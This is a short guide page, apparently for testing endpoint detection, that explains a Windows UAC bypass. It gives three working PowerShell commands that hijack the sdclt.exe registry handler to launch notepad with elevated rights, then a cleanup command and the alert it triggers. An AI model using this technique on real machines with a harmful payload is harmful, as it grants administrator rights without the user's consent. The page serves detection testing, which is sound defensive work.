# UAC Bypass

UAC Bypass is a technique where attackers elevate their privileges to gain administrator-level permissions without triggering a User Account Control (UAC) prompt. This allows them to perform restricted tasks without user confirmation, bypassing security checks that would typically prevent unauthorized actions.

## Simulation

Run the following commands in PowerShell on a test device.

```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath "$env:windir\system32\sdclt.exe"
```

## Cleanup

```powershell
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
```

## Detections

| Alert Title | Alert Description | Alert Details |
| -- | -- | -- |
| UAC bypass was detected | A process has performed actions on a child process or another subsequent process that would normally require a User Account Control (UAC) prompt. This could be an attempt to elevate privileges without requesting user permission. | **Category:** Privilege escalation<br/>**MITRE ATT&CK Techniques:** T1112: Modify Registry, T1548.002: Bypass User Account Control<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |
